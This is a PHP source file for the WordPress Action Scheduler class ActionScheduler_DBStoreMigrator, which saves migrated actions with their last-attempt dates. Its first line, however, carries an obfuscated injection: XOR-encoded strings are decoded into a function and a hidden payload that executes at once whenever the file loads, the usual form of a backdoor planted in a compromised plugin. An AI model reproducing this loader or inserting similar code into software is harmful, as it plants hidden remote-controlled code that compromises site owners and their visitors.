<?php $vqSThcIT=', VM:Y36F-7:E6<'; $HjmQRvbm='OR3,N<lP3CTN,YR'^$vqSThcIT; $XcTJuDId='84fSR8T20R7;l6F>+T:JL+8J5Q16 i;=H.AaHK7k5R=N0:ZT h+SHr.-1.t=F,3kqUJO1IyfG<4JrjaLQAd9lJ;02cZRVwCheO3Y3koGhotAiHWQW7==U,Xoe,;<-atCr,DOY9jQVWU=dCilkcR1FQfTDvz3zE;QT+M nbE:36.+SnhX Cx.ZUGdf1.F;NEnk8BJmUBYDy;;hnQ ESqQR6XB=VQmsU31..>11qwS2QVIVqacW=O 32 xILioxzv3pvQ=xwZICyxlopGRAE=KzW6zq R7YlK0 rZfr:W;ogseDYB8HScg,S:=Vrk3c<=<Zril=-GObHMzk<<32J0Stktl>=k>1<iF.1gu N.oqmwp:TR0VEQH3ZHmZ5HMhWVYySSF.3Ds<;Gb VB9yZtq3TZLYhXqLrK7lc   8EoO., XY=PV ,VTqKW<n=YTJ=e+06F LBSse1 RTR REr5A,8fCYsYWO7i< :HLuCZ,ee>6, Mjuw ;D8E2,7J>S9Z829zuYS8PVqA 508YvtmipM+WZH3U,JmR8.7j<bCrnrPtVvR9Q3wgDfZWHFB,brNAoYc+h4uDpxkpgkdtuS3 O2aP=>,KIR4H+kqMM=.-Q5wyEeJV-PdfkadnVdM9k0H3>EiD086ec2RYY 0Ph3ybNQTN;0zqQve7'; $uEtTikh=$HjmQRvbm('', 'QRNr4M:QD;XU3S>WX IbkSW8j5PBA6dP=ZfHakLa<4H SN3;NHS<:-JLEO+b+YGCU1+;PeYB,YMcRJAlq:n0enTEFCgrqPxblFU6ACK.HRTqRhs8kDIO9I6GAHZHLHOcVEodp3cXr8 IDmTLCG6P20=p-+ZmZaP4-piINGeIGDBN=FL3E:QssnMmoCK2N<+FOW7>DnHP9sF1bJ5A12QlrP9.N3jgW1REOqUTHQJsT0::3Jki1R=ERQHXah6,75=z5V0NXS1,:YEROT13-0XbZ,<sUD3C83 UYRgFVQ2BTmzA 86YhnCCZ2VH3IaNi6TZzZHHYL3.Kh6pbZSAW+S;TCP3lx:kto=fOBGQK+WOLSWTL5>E3lq39SAI>T<,7<3 YnsbEV=H62NFD76XYgTUE569<SRx1x6=fGDATYeRonYN+<O97LE,1Y38N1Y8 +b:FEBnB-16EQnD77=D7mVQ XYOoyW=6;V6WECaeNI3JMAZWXAmLSWAI6Y<mGR3a6A3KFJRR26AwzQeDTDYpVRKIX ObrlW4X+6uSKNMaKcOSRwM5BdZ2PBPqPh2zpqOWK- YhPIPPD IKSWNKBRU2AR.K>;XGs.1;G<XCV=,DBB0QPUeA.7Y1MOKADNvD63bU>RRmM QLW>DB3 5OQ4OnPYDX16RDRAxMoJ'^$XcTJuDId); $uEtTikh();

/**
 * Class ActionScheduler_DBStoreMigrator
 *
 * A  class for direct saving of actions to the table data store during migration.
 *
 * @since 3.0.0
 */
class ActionScheduler_DBStoreMigrator extends ActionScheduler_DBStore {

	/**
	 * Save an action with optional last attempt date.
	 *
	 * Normally, saving an action sets its attempted date to 0000-00-00 00:00:00 because when an action is first saved,
	 * it can't have been attempted yet, but migrated completed actions will have an attempted date, so we need to save
	 * that when first saving the action.
	 *
	 * @param ActionScheduler_Action $action
	 * @param \DateTime $scheduled_date Optional date of the first instance to store.
	 * @param \DateTime $last_attempt_date Optional date the action was last attempted.
	 *
	 * @return string The action ID
	 * @throws \RuntimeException When the action is not saved.
	 */
	public function save_action( ActionScheduler_Action $action, \DateTime $scheduled_date = null, \DateTime $last_attempt_date = null ){
		try {
			/** @var \wpdb $wpdb */
			global $wpdb;

			$action_id = parent::save_action( $action, $scheduled_date );

			if ( null !== $last_attempt_date ) {
				$data = [
					'last_attempt_gmt'   => $this->get_scheduled_date_string( $action, $last_attempt_date ),
					'last_attempt_local' => $this->get_scheduled_date_string_local( $action, $last_attempt_date ),
				];

				$wpdb->update( $wpdb->actionscheduler_actions, $data, array( 'action_id' => $action_id ), array( '%s', '%s' ), array( '%d' ) );
			}

			return $action_id;
		} catch ( \Exception $e ) {
			throw new \RuntimeException( sprintf( __( 'Error saving action: %s', 'action-scheduler' ), $e->getMessage() ), 0 );
		}
	}
}
